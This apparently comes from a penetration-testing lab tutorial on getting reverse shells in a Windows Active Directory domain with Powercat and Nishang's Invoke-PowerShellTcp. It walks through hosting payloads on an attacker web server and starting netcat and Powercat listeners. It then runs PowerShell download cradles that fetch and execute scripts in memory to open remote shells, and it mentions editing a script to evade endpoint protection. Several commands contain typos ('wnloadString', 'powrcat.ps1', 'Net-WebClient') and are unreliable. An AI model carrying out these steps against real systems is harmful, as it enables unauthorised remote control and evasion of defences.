# Active Directory - Reverse Shell - Powercat [Linux and Windows]

In this documentation, we will demonstrate two ways that an attacker can get a reverse shell once in a windows active directory domain. The technique used in this lab will involve the use of **Powercat** from both Kali Linux as well as Windows.

![Untitled](./ActiveDirectory/Powercat/Active%20Directory%20-%20Reverse%20Shell%20-%20Powercat%20%5BLinux%2076d3b807088c437091930cb01f448cad/Untitled.png)

**Method 1:** Using Kali Linux

**Method 2:** Using a Windows System

## Reverse Shell Demonstration - Kali Linux Method

Getting a reverse-shell with **`Powercat`** hosted on our attacking Kali Machine

We will download the **`Powercat` script** from **`Github`** or locate the binary on your Kali machine

```bash
git clone https://github.com/besimorhino/powercat.git
```

![Untitled](./ActiveDirectory/Powercat/Active%20Directory%20-%20Reverse%20Shell%20-%20Powercat%20%5BLinux%2076d3b807088c437091930cb01f448cad/Untitled%201.png)

If powershell-empire is installed on your Kali Linux Machine, you might be able to locate the file here: 

![Untitled](./ActiveDirectory/Powercat/Active%20Directory%20-%20Reverse%20Shell%20-%20Powercat%20%5BLinux%2076d3b807088c437091930cb01f448cad/Untitled%202.png)

In order to execute this attack, we must host the file on kali linux and execute it from the Windows Client in the active directory environment.  To this, we simply start a Python Web Server on our attacking machine.

**Starting a Python Web Server and host the file (`Powercat.ps1`)** 

```bash
python3 -m http.server 80
```

![Untitled](./ActiveDirectory/Powercat/Active%20Directory%20-%20Reverse%20Shell%20-%20Powercat%20%5BLinux%2076d3b807088c437091930cb01f448cad/Untitled%203.png)

With our web server started on port 80, we will start a netcat listener on port 4455. This netcat listening will listen for an incoming connection on port 4455 on our kali attacking computer. This means, once the file has been executed on the windows client, a connection will be sent back to our attacking machine, where we will have system command execution access on the remote system.

Start a **`netcat`** listener for a return shell

```bash
sudo nc -nlvp 4455
```

![Untitled](./ActiveDirectory/Powercat/Active%20Directory%20-%20Reverse%20Shell%20-%20Powercat%20%5BLinux%2076d3b807088c437091930cb01f448cad/Untitled%204.png)

On the Windows Target Machine, we will execute the below **`powershell`** download cradle which will download and execute the command without saving the file to the local hardisk of the target computer.

```bash
powershell -c "IEX(New-Object System.Net.WebClient).wnloadString('http://192.168.0.23/powrcat.ps1');powercat -c 192.168.0.23 -p 4455 -e cmd"
```

![Untitled](./ActiveDirectory/Powercat/Active%20Directory%20-%20Reverse%20Shell%20-%20Powercat%20%5BLinux%2076d3b807088c437091930cb01f448cad/Untitled%205.png)

Revisiting our **`netcat`** listener on our kali linux attacking machine, we can see that we were able to get a reverse shell.

![Untitled](./ActiveDirectory/Powercat/Active%20Directory%20-%20Reverse%20Shell%20-%20Powercat%20%5BLinux%2076d3b807088c437091930cb01f448cad/Untitled%206.png)

## Reverse Shell Demonstration - Windows Method

**Kali:** 192.168.0.23 - Attacker’s Machine

**Windows Client 1:** 192.168.0.31 - Foothold Machine

**Windows Client 2:** 192.168.0.40 (Target)

In this scenario, we will demonstrate hosting the powercat file on a Windows System using hfs **[Http File Server] -** URL: [https://www.rejetto.com/hfs/?f=dl](https://www.rejetto.com/hfs/?f=dl)

![Untitled](./ActiveDirectory/Powercat/Active%20Directory%20-%20Reverse%20Shell%20-%20Powercat%20%5BLinux%2076d3b807088c437091930cb01f448cad/Untitled%207.png)

After executing the **HFS binary**, we will note the url (which we will use to download and execute our powershell script from client 2 - 192.168.0.40). 

![Untitled](./ActiveDirectory/Powercat/Active%20Directory%20-%20Reverse%20Shell%20-%20Powercat%20%5BLinux%2076d3b807088c437091930cb01f448cad/Untitled%208.png)

### Transferring Invoke-PowerShellTCP Script to Client 1

URL: [https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

We will transfer the `**Invoke-PowerShellTcpEx.ps1**` file from our Kali Machine onto our Windows Domain Client - Client 1 [192.168.0.31]

From our Kali Linux computer, we can start a Python Web Server using the below commands.

```bash
python3 -m http.server 80
```

![Untitled](./ActiveDirectory/Powercat/Active%20Directory%20-%20Reverse%20Shell%20-%20Powercat%20%5BLinux%2076d3b807088c437091930cb01f448cad/Untitled%209.png)

After starting the web server, we can transfer the powershell script to client 1 using the below command.

```bash
iwr -uri http://192.168.0.23/Invoke-PowerShellTcpEx.ps1 -Outfile Invoke-PowerShellTcpEx.ps1
```

![Untitled](./ActiveDirectory/Powercat/Active%20Directory%20-%20Reverse%20Shell%20-%20Powercat%20%5BLinux%2076d3b807088c437091930cb01f448cad/Untitled%2010.png)

We will edit the `**Invoke-PowerShellTcpEx.ps1**` file for sake of avoiding detection problems from endpoint protection.

![Untitled](./ActiveDirectory/Powercat/Active%20Directory%20-%20Reverse%20Shell%20-%20Powercat%20%5BLinux%2076d3b807088c437091930cb01f448cad/Untitled%2011.png)

![Untitled](./ActiveDirectory/Powercat/Active%20Directory%20-%20Reverse%20Shell%20-%20Powercat%20%5BLinux%2076d3b807088c437091930cb01f448cad/Untitled%2012.png)

![Untitled](./ActiveDirectory/Powercat/Active%20Directory%20-%20Reverse%20Shell%20-%20Powercat%20%5BLinux%2076d3b807088c437091930cb01f448cad/Untitled%2013.png)

**From Client1 [192.168.0.31]** we will setup a Powercat listener on port 443

```bash
powercat -l -v -p 443 -t 100000
```

![Untitled](./ActiveDirectory/Powercat/Active%20Directory%20-%20Reverse%20Shell%20-%20Powercat%20%5BLinux%2076d3b807088c437091930cb01f448cad/Untitled%2014.png)

**From Client2 [192.168.0.40]** we will issue the powershell download cradle command.

```bash
IEX (New-Object Net-WebClient).downloadstring('http://192.168.0.31/Invoke-PowerShellTcpEx.ps1')
```

![Untitled](./ActiveDirectory/Powercat/Active%20Directory%20-%20Reverse%20Shell%20-%20Powercat%20%5BLinux%2076d3b807088c437091930cb01f448cad/Untitled%2015.png)

![Untitled](./ActiveDirectory/Powercat/Active%20Directory%20-%20Reverse%20Shell%20-%20Powercat%20%5BLinux%2076d3b807088c437091930cb01f448cad/Untitled%2016.png)

![Untitled](./ActiveDirectory/Powercat/Active%20Directory%20-%20Reverse%20Shell%20-%20Powercat%20%5BLinux%2076d3b807088c437091930cb01f448cad/Untitled%2017.png)